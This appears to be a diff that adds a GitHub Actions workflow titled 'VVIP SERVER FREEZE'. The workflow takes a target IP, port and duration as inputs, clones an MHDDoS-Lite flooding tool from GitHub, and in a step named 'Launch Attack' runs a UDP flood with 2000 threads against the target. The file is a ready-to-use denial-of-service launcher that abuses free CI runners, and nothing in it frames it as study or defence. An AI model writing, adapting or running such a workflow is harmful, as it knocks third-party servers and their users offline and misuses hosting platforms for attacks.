@@ -1,0 +1,39 @@
+name: VVIP SERVER FREEZE
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'Target IP'
+        required: true
+      target_port:
+        description: 'Target Port'
+        required: true
+      duration:
+        description: 'Time (Seconds)'
+        required: true
+        default: '120'
+
+jobs:
+  freeze:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout Engine
+      uses: actions/checkout@v3
+      
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+        
+    - name: Install Requirements
+      run: |
+        git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git engine
+        cd engine
+        pip install requests yarl multidict aiohttp
+        
+    - name: Launch Attack
+      run: |
+        cd engine
+        python3 start.py UDP ${{ github.event.inputs.target_ip }} ${{ github.event.inputs.target_port }} 2000 ${{ github.event.inputs.duration }}
+        
